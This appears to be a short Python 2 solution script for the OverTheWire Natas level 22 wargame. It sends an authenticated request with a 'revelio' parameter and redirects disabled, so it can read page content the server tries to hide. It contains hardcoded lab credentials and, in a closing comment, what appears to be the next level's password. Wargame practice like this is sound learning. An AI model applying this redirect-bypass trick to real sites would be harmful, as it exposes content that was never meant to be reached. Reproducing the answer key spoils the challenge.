import requests
from string import *

username='natas22'
password='chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
url='http://natas22.natas.labs.overthewire.org/?revelio=1'
session=requests.Session()

response=session.get(url,auth=(username,password),allow_redirects=False)
print response.text
print "="*80
print response.cookies
print "="*80

#D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
